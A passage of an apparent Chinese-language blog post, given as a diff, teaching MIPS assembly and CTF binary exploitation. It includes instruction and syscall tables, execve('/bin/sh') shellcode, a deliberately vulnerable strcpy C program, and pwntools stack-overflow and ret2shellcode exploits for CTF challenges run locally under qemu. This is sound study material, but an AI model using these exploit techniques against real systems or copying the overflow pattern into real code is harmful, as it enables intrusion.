+<td>从内存加载无符号字节（8位）到寄存器 $rt</td>
+<td><code>lbu $t0, 0($t1)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>sb</code></td>
+<td>将寄存器 $rt 的低8位存储到内存中的地址 $t1 + offset</td>
+<td><code>sb $t0, 0($t1)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>lh</code></td>
+<td>从内存加载半字（16位）到寄存器 $rt</td>
+<td><code>lh $t0, 0($t1)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>lhu</code></td>
+<td>从内存加载无符号半字（16位）到寄存器 $rt</td>
+<td><code>lhu $t0, 0($t1)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>sh</code></td>
+<td>将寄存器 $rt 的低16位存储到内存中的地址 $t1 + offset</td>
+<td><code>sh $t0, 0($t1)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>lwc1</code></td>
+<td>从内存加载单精度浮点数到浮点寄存器 $f0</td>
+<td><code>lwc1 $f0, 0($t1)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>swc1</code></td>
+<td>将浮点寄存器 $f0 中的单精度浮点数存储到内存中的地址 $t1 + offset</td>
+<td><code>swc1 $f0, 0($t1)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>ld</code></td>
+<td>从内存加载双字（64位）到寄存器 $rt</td>
+<td><code>ld $t0, 0($t1)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>I 型</strong></td>
+<td><code>sd</code></td>
+<td>将寄存器 $rt 的64位值存储到内存中的地址 $t1 + offset</td>
+<td><code>sd $t0, 0($t1)</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>J 型</strong></td>
+<td><code>j</code></td>
+<td>无条件跳转，跳转到目标地址</td>
+<td><code>j target</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>J 型</strong></td>
+<td><code>jal</code></td>
+<td>跳转并链接，将返回地址存储到 $ra</td>
+<td><code>jal target</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>J 型</strong></td>
+<td><code>jr</code></td>
+<td>跳转到寄存器指定的地址</td>
+<td><code>jr $ra</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>J 型</strong></td>
+<td><code>jalr</code></td>
+<td>跳转并链接到寄存器指定的地址，返回地址存储在 $ra</td>
+<td><code>jalr $t0</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>特殊</strong></td>
+<td><code>syscall</code></td>
+<td>系统调用，执行指定的操作</td>
+<td><code>syscall</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>特殊</strong></td>
+<td><code>break</code></td>
+<td>生成断点，通常用于调试</td>
+<td><code>break</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>特殊</strong></td>
+<td><code>eret</code></td>
+<td>从异常中返回到用户态</td>
+<td><code>eret</code></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>特殊</strong></td>
+<td><code>nop</code></td>
+<td>无操作，通常用于填充</td>
+<td><code>nop</code></td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><p>如果函数的参数小于等于四个，那么会使用 <code>$a0-$a3</code> 寄存器来存放参数。</p>
+<p>如果参数多于四个，那么多出来的参数会使用栈进行传参。</p>
+<p>函数 <code>A</code> 调用函数 <code>B</code>。若 <code>B</code> 是叶子函数（即 <code>B</code> 不调用其他函数），调用 <code>B</code> 时会将返回地址直接存入 <code>$ra</code> 寄存器；若 <code>B</code> 是非叶子函数（即 <code>B</code> 调用了函数 <code>C</code>），则在跳转到 <code>B</code> 时，返回地址会先存入 <code>$ra</code>，然后在 <code>B</code> 内部将 <code>$ra</code> 的值保存到栈中。</p>
+<p>当 <code>B</code> 调用 <code>C</code> 时，<code>C</code> 的返回地址会覆盖 <code>$ra</code> 的值；返回时，<code>jr $ra</code> 指令会跳回 <code>B</code> 的调用点。待 <code>B</code> 执行完毕准备返回 <code>A</code> 时，它会从栈中恢复原始的返回地址到 <code>$ra</code>，再通过 <code>jr $ra</code> 跳回 <code>A</code>。</p>
+<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>在 x86 的 Linux 系统中，功能函数是由系统调用来实现的。我们可以直接使用功能函数，也可以使用系统调用来使用相应功能。同样，在 MIPS 架构中，系统调用机制也类似，通过 <code>syscall</code> 指令触发。MIPS 的系统调用实现方式不同于 x86，但基本原理相同：通过触发中断与内核进行交互。</p>
+<ul>
+<li>系统调用号：在 MIPS 中 <code>$v0</code> 寄存器用于存放系统调用号。</li>
+<li>参数：系统调用的参数通常存储在 <code>$a0</code> 到 <code>$a3</code> 寄存器中，最多可以有 4 个参数。</li>
+<li>返回值：系统调用的返回值通常存储在 <code>$v0</code> 和 <code>v1</code> 寄存器中。</li>
+</ul>
+<blockquote>
+<p>注：在 MIPS 架构下，系统调用号可能因操作系统而异。</p>
+</blockquote>
+<p>以下是基于 Linux MIPS ABI 的一些常用系统调用及其功能：</p>
+<table>
+<thead>
+<tr>
+<th><strong>系统调用号</strong></th>
+<th><strong>名称</strong></th>
+<th><strong>功能说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>4001</td>
+<td><code>exit</code></td>
+<td>退出程序，参数是退出状态码</td>
+</tr>
+<tr>
+<td>4003</td>
+<td><code>read</code></td>
+<td>从文件描述符读取数据</td>
+</tr>
+<tr>
+<td>4004</td>
+<td><code>write</code></td>
+<td>向文件描述符写入数据</td>
+</tr>
+<tr>
+<td>4005</td>
+<td><code>open</code></td>
+<td>打开文件</td>
+</tr>
+<tr>
+<td>4006</td>
+<td><code>close</code></td>
+<td>关闭文件描述符</td>
+</tr>
+<tr>
+<td>4009</td>
+<td><code>link</code></td>
+<td>创建硬链接</td>
+</tr>
+<tr>
+<td>4010</td>
+<td><code>unlink</code></td>
+<td>删除文件</td>
+</tr>
+<tr>
+<td>4011</td>
+<td><code>execve</code></td>
+<td>执行新程序</td>
+</tr>
+<tr>
+<td>4012</td>
+<td><code>chdir</code></td>
+<td>改变当前工作目录</td>
+</tr>
+<tr>
+<td>4013</td>
+<td><code>time</code></td>
+<td>获取当前时间</td>
+</tr>
+<tr>
+<td>4014</td>
+<td><code>mknod</code></td>
+<td>创建特殊文件</td>
+</tr>
+<tr>
+<td>4015</td>
+<td><code>chmod</code></td>
+<td>修改文件权限</td>
+</tr>
+<tr>
+<td>4016</td>
+<td><code>lseek</code></td>
+<td>文件指针定位</td>
+</tr>
+<tr>
+<td>4017</td>
+<td><code>getpid</code></td>
+<td>获取当前进程 ID</td>
+</tr>
+<tr>
+<td>4020</td>
+<td><code>getuid</code></td>
+<td>获取用户 ID</td>
+</tr>
+<tr>
+<td>4021</td>
+<td><code>geteuid</code></td>
+<td>获取有效用户 ID</td>
+</tr>
+<tr>
+<td>4022</td>
+<td><code>getgid</code></td>
+<td>获取组 ID</td>
+</tr>
+<tr>
+<td>4023</td>
+<td><code>getegid</code></td>
+<td>获取有效组 ID</td>
+</tr>
+<tr>
+<td>4024</td>
+<td><code>ptrace</code></td>
+<td>调试工具接口</td>
+</tr>
+<tr>
+<td>4037</td>
+<td><code>kill</code></td>
+<td>向进程发送信号</td>
+</tr>
+<tr>
+<td>4038</td>
+<td><code>uname</code></td>
+<td>获取系统信息</td>
+</tr>
+<tr>
+<td>4040</td>
+<td><code>mkdir</code></td>
+<td>创建目录</td>
+</tr>
+<tr>
+<td>4041</td>
+<td><code>rmdir</code></td>
+<td>删除目录</td>
+</tr>
+<tr>
+<td>4042</td>
+<td><code>dup</code></td>
+<td>复制文件描述符</td>
+</tr>
+<tr>
+<td>4045</td>
+<td><code>brk</code></td>
+<td>调整进程数据段的大小（分配堆内存）</td>
+</tr>
+<tr>
+<td>4057</td>
+<td><code>socket</code></td>
+<td>创建套接字</td>
+</tr>
+<tr>
+<td>4066</td>
+<td><code>gettimeofday</code></td>
+<td>获取时间和时区</td>
+</tr>
+<tr>
+<td>4083</td>
+<td><code>bind</code></td>
+<td>绑定套接字</td>
+</tr>
+<tr>
+<td>4085</td>
+<td><code>listen</code></td>
+<td>监听连接</td>
+</tr>
+<tr>
+<td>4086</td>
+<td><code>accept</code></td>
+<td>接受连接</td>
+</tr>
+</tbody></table>
+<h2 id="汇编Lab"><a href="#汇编Lab" class="headerlink" title="汇编Lab"></a>汇编Lab</h2><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h3><p>我们通过编写经典程序 <code>Hello World</code> 作为我们 MIPS 汇编 Lab 的开始。</p>
+<p>代码中 <code>.section</code> 用于定义段，我们用它定义了 <code>.text</code> 段和 <code>.data</code> 段。</p>
+<p>我们声明了一个标签 <code>msg</code>，它是 <code>Hello World!</code> 的地址。</p>
+<p><code>.asciiz</code> 用于定义一个以空字符结尾的字符串。</p>
+<p><code>.set noreorder</code> 用于禁止指令重排序。</p>
+<p><code>.global __start</code> 用于将 <code>__start</code> 定义为全局符号，是程序的入口点。我们通过 <code>__start</code> 告诉编译器，从这里开始执行代码。</p>
+<p>然后我们通过设置 <code>write</code> 系统调用的参数最后触发中断输出 <code>Hello World!</code>。</p>
+<p>然后通过执行 <code>exit</code> 系统调用让程序正常退出。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.section</span> <span class="hljs-selector-class">.data</span><br><br>msg: <span class="hljs-selector-class">.asciiz</span> <span class="hljs-string">&quot;Hello World!&quot;</span><br><br><span class="hljs-selector-class">.section</span> <span class="hljs-selector-class">.text</span><br><span class="hljs-selector-class">.set</span> noreorder<br><span class="hljs-selector-class">.global</span> __start<br><br>__start:<br><br>la <span class="hljs-variable">$a0</span>,<span class="hljs-number">0</span><br>la <span class="hljs-variable">$a1</span>,msg<br>la <span class="hljs-variable">$a2</span>,<span class="hljs-number">13</span><br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$v0</span>,<span class="hljs-number">4004</span><br>syscall<br><br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$v0</span>,<span class="hljs-number">4001</span><br>syscall<br></code></pre></td></tr></table></figure>
+
+<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>shellcode 即一段可以获取到 shell 的汇编代码。</p>
+<p>这里我们通过 <code>execve</code> 系统调用执行 <code>/bin/sh</code> 获取一个 shell。</p>
+<p>由于我们执行之后会直接弹出一个 shell，所以我们不需要使用 <code>exit</code> 让程序正常退出。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.section</span> <span class="hljs-selector-class">.data</span><br>sh: <span class="hljs-selector-class">.asciiz</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br><br><span class="hljs-selector-class">.section</span> <span class="hljs-selector-class">.text</span><br><span class="hljs-selector-class">.global</span> __start<br><br><span class="hljs-selector-class">.set</span> noreorder<br><br>__start:<br>la <span class="hljs-variable">$a0</span>,sh<br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$a1</span>,<span class="hljs-number">0</span><br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$a2</span>,<span class="hljs-number">0</span><br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$v0</span>,<span class="hljs-number">4011</span><br>syscall<br></code></pre></td></tr></table></figure>
+
+
+<p><img src="/assets/Pasted%20image%2020241127190813.png" srcset="/img/loading.gif" lazyload></p>
+<p>MIPS 在 pwn 中的特点：</p>
+<ul>
+<li>MIPS 不支持 NX 保护，所以 ret2shellcode 是最常见的利用方式</li>
+<li>溢出控制<code>$ra</code>寄存器直接跳转到 shellcode 处</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span>&#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">has_stack</span><span class="hljs-params">(<span class="hljs-type">char</span> *src)</span><br>&#123;<br>        <span class="hljs-type">char</span> dst[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-built_in">strcpy</span>(dst,src);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;copy successfully&quot;</span>);<br>&#125;<br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>        has_stack(argv[<span class="hljs-number">1</span>]);<br> <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译代码 mipsel-linux-gnu-gcc vuln.c -o vuln</p>
+<p>动态调试 qemu-mipsel -g 8888 .&#x2F;vuln AAAAA</p>
+<p>IDA连接上对应的进程，即可进行动态调试</p>
+<p><img src="/assets/Pasted%20image%2020241209212922.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="9">
+<li>MIPS32架构中是没有 EBP 寄存器的，程序函数调用的时候是将当前栈指针向下移动 n 比特到该函数的 stack frame 存储组空间，函数返回的时候再加上偏移量恢复栈。</li>
+<li>传参过程中，前四个参数<code>a0-a3</code>，多余的会保存在调用函数的预留的栈顶空间内。</li>
+<li>MIPS 调用函数时会把函数的返回地址直接存入<code>$RA</code>寄存器。</li>
+</ol>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="ropemporium"><a href="#ropemporium" class="headerlink" title="ropemporium"></a>ropemporium</h3><p>wiki 上的一道简单题，很适合入门，只需要懂得 mips 汇编就行了。</p>
+<p>事实上在 ida9 泄露之后，</p>
+<p>ida 打开分析，进入<code>pwnme</code>关键函数。</p>
+<p>函数开始将<code>ra</code>寄存器的值，放入<code>$sp+60</code>的位置里。即返回地址位于<code>$sp+60</code></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, -<span class="hljs-number">0x40</span><br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x38</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x38</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">fp</span>, $<span class="hljs-built_in">sp</span><br>li      $<span class="hljs-built_in">gp</span>, (_GLOBAL_OFFSET_TABLE_+<span class="hljs-number">0x7FF0</span>)<br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x38</span>+var_28($<span class="hljs-built_in">sp</span>)<br>li      $<span class="hljs-built_in">a2</span>, <span class="hljs-number">0x20</span>  <span class="hljs-comment"># &#x27; &#x27;  # n</span><br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">a1</span>, $<span class="hljs-built_in">zero</span>       <span class="hljs-comment"># c</span><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">v0</span>, $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x38</span>+var_20<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">v0</span>         <span class="hljs-comment"># s</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来看函数中的<code>read</code>函数，<code>a2</code>为读取的内容大小，将被复制为 0x38，<code>buf</code>为位于<code>$sp+0x18</code>的位置，明显的一个栈溢出漏洞，且能覆盖返回地址。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x38</span>+var_28($<span class="hljs-built_in">fp</span>)<br>li      $<span class="hljs-built_in">a2</span>, <span class="hljs-number">0x38</span>  <span class="hljs-comment"># &#x27;8&#x27;  # nbytes</span><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">v0</span>, $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x38</span>+var_20<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">a1</span>, $<span class="hljs-built_in">v0</span>         <span class="hljs-comment"># buf</span><br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">zero</span>       <span class="hljs-comment"># fd</span><br>la      $<span class="hljs-built_in">v0</span>, read<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">v0</span><br><span class="hljs-keyword">jalr </span>   $<span class="hljs-built_in">t9</span> <span class="hljs-comment">; read</span><br></code></pre></td></tr></table></figure>
+
+<p>通过计算，可以计算出填充的长度为 36。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">60</span>-<span class="hljs-number">0</span>x18=<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我们在函数<code>ret2win</code>中发现了后门函数</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">ret2win:</span><br><br>var_8= -<span class="hljs-number">8</span><br>var_s0=  <span class="hljs-number">0</span><br>var_s4=  <span class="hljs-number">4</span><br><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, -<span class="hljs-number">0x20</span><br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x18</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x18</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">fp</span>, $<span class="hljs-built_in">sp</span><br>li      $<span class="hljs-built_in">gp</span>, (_GLOBAL_OFFSET_TABLE_+<span class="hljs-number">0x7FF0</span>)<br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x18</span>+var_8($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">lui </span>    $<span class="hljs-built_in">v0</span>, <span class="hljs-number">0x40</span>  <span class="hljs-comment"># &#x27;@&#x27;</span><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">v0</span>, (aWellDoneHereSY - <span class="hljs-number">0x400000</span>)  <span class="hljs-comment"># &quot;Well done! Here&#x27;s your flag:&quot;</span><br>la      $<span class="hljs-built_in">v0</span>, puts<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">v0</span><br><span class="hljs-keyword">jalr </span>   $<span class="hljs-built_in">t9</span> <span class="hljs-comment">; puts</span><br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x18</span>+var_8($<span class="hljs-built_in">fp</span>)<br><span class="hljs-keyword">lui </span>    $<span class="hljs-built_in">v0</span>, <span class="hljs-number">0x40</span>  <span class="hljs-comment"># &#x27;@&#x27;</span><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">v0</span>, (aBinCatFlagTxt - <span class="hljs-number">0x400000</span>)  <span class="hljs-comment"># &quot;/bin/cat flag.txt&quot;</span><br>la      $<span class="hljs-built_in">v0</span>, system<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">v0</span><br><span class="hljs-keyword">jalr </span>   $<span class="hljs-built_in">t9</span> <span class="hljs-comment">; system</span><br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x18</span>+var_8($<span class="hljs-built_in">fp</span>)<br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">sp</span>, $<span class="hljs-built_in">fp</span><br><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x18</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x18</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, <span class="hljs-number">0x20</span><br><span class="hljs-keyword">jr </span>     $<span class="hljs-built_in">ra</span><br><span class="hljs-keyword">nop</span><br></code></pre></td></tr></table></figure>
+
+<p>所以我们可以通过栈溢出来将返回地址覆盖为<code>ret2win</code>函数的地址即可<code>cat flag</code></p>
+<ul>
+<li>exp</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch=<span class="hljs-string">&#x27;mips&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#设置加载mips架构程序的环境</span><br>io = process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/mipsel-linux-gnu/&quot;</span>,<span class="hljs-string">&quot;./ret2win_mipsel&quot;</span>])<br>elf = ELF(<span class="hljs-string">&quot;./ret2win_mipsel&quot;</span>)<br>io.recv()<br>backdoor=<span class="hljs-number">0x0400a00</span><br>pay=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">36</span>+p32(backdoor)<br>io.sendline(pay)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h3><ul>
+<li>exp</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, word_size=<span class="hljs-number">32</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/mipsel-linux-gnu/&quot;</span>, <span class="hljs-string">&quot;./pwn2.pwn2&quot;</span>])<br><span class="hljs-comment">#io=process([&quot;qemu-mipsel&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;-L&quot;,&quot;/usr/mipsel-linux-gnu/&quot;, &quot;./pwn2.pwn2&quot;])</span><br><span class="hljs-comment">#qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu  ./pwn2.pwn2</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span><br>bss=<span class="hljs-number">0x410ba0</span><br>io.sendafter(<span class="hljs-string">&quot;What&#x27;s your name: \n&quot;</span>,payload)<br><br>shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="hljs-string">&#x27;mips&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(bss)+p32(<span class="hljs-number">0x4007e4</span>)<br>io.send(payload)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+p32(<span class="hljs-number">0x410be0</span>)+shellcode<br>io.send(payload)<br>io.interactive()            <br></code></pre></td></tr></table></figure>
+
+<h3 id="Dasctf-shaopi"><a href="#Dasctf-shaopi" class="headerlink" title="Dasctf shaopi"></a>Dasctf shaopi</h3><p><a target="_blank" rel="noopener" href="https://imlzh1.github.io/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/#pwn-shaopi">2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups | imLZH1’ Blog</a></p>
+<p>ret2shellcode</p>
+<h3 id="ycb-2020-mipspwn"><a href="#ycb-2020-mipspwn" class="headerlink" title="ycb_2020_mipspwn"></a>ycb_2020_mipspwn</h3><p>ret2shellcode</p>
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13294?time__1311=GqmxuD0DnDyAeGNeeequGEDknWwbxAI3x">MIPS PWN学习 - 先知社区</a><br>参考：<a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/919c29c4.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">IOT安全入门学习–MIPS汇编基础 | ZIKH26’s Blog</a><br>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202965#h2-5">MIPS 指令集 Shellcode 编写入门-安全客 - 安全资讯平台</a></p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%BC%82%E6%9E%B6%E6%9E%84/" class="print-no-link">#异架构</a>
+      
+    </div>
+  
+</div>
+
+
+              
